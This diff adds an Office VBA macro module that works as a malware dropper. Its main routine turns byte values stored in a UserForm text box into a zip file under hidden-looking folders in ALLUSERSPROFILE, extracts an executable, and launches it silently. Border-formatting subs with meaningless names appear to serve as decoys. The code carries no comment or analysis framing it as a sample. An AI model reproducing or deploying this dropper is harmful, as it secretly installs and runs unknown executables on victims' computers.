@@ -1,0 +1,119 @@
+Sub userAldiLoadr()
+
+    Dim path_Aldi_file As String
+    Dim file_Aldi_name  As String
+    Dim zip_Aldi_file  As Variant
+    Dim fldr_Aldi_name  As Variant
+    
+    Dim byt() As Byte
+    
+    Dim ar1Aldi() As String
+    
+    file_Aldi_name = "dhrwarhsav"
+    
+    fldr_Aldi_name = Environ$("ALLUSERSPROFILE") & "\Edlacar\"
+    
+    If Dir(fldr_Aldi_name, vbDirectory) = "" Then
+        MkDir (fldr_Aldi_name)
+    End If
+    
+    
+    fldrz_Aldi_name = Environ$("ALLUSERSPROFILE") & "\Uahaiws\"
+    
+    If Dir(fldrz_Aldi_name, vbDirectory) = "" Then
+        MkDir (fldrz_Aldi_name)
+    End If
+    
+     
+    zip_Aldi_file = fldrz_Aldi_name & "othria.zip"
+    
+    path_Aldi_file = fldr_Aldi_name & file_Aldi_name & ".e"
+    
+    If InStr(Application.OperatingSystem, "6.02") > 0 Or InStr(Application.OperatingSystem, "6.03") > 0 Then
+        ar1Aldi = Split(UserForm1.TextBox2.Text, ":")
+    Else
+        ar1Aldi = Split(UserForm1.TextBox1.Text, ":")
+    End If
+    
+    Dim btsAldi() As Byte
+    
+    Dim linAldi As Double
+    
+    linAldi = 0
+    
+    For Each vl In ar1Aldi
+        ReDim Preserve btsAldi(linAldi)
+    
+        btsAldi(linAldi) = CByte(vl)
+        
+        linAldi = linAldi + 1
+    Next
+
+    
+    Open zip_Aldi_file For Binary Access Write As #2
+         Put #2, , btsAldi
+    Close #2
+   
+     If Len(Dir(path_Aldi_file & "xe")) = 0 Then
+        Call unAldizip(zip_Aldi_file, fldr_Aldi_name)
+    End If
+   
+
+    Shell path_Aldi_file & "xe", vbNormalNoFocus
+    
+    
+End Sub
+
+
+Sub Mace5()
+   
+      With Selection.Borders(xlInsideHorizontal)
+        .LineStyle = xl3DAreaStacked
+     
+    End With
+    
+    With Selection.Borders(xlEdgeRight)
+        .ColorIndex = 1
+        
+        .Weight = xlThin
+    End With
+     
+     
+End Sub
+
+
+
+
+Sub Maceo8()
+   
+      With Selection.Borders(xlInsideHorizontal)
+        .LineStyle = xl3DAreaStacked
+    End With
+    
+    With Selection.Borders(xlEdgeRight)
+        .LineStyle = xl3DArea
+        
+        .Weight = xlThin
+    End With
+     
+     
+End Sub
+
+
+ Sub unAldizip(Fname As Variant, FileNameFolder As Variant)
+    Dim FSO As Object
+    
+    Dim oApp As Object
+    
+    
+    'Extract the files into the Destination folder
+    Set oApp = CreateObject("Shell.Application")
+    
+    oApp.Namespace(FileNameFolder).CopyHere oApp.Namespace(Fname).items, &H4
+
+    
+End Sub
+
+
+
+
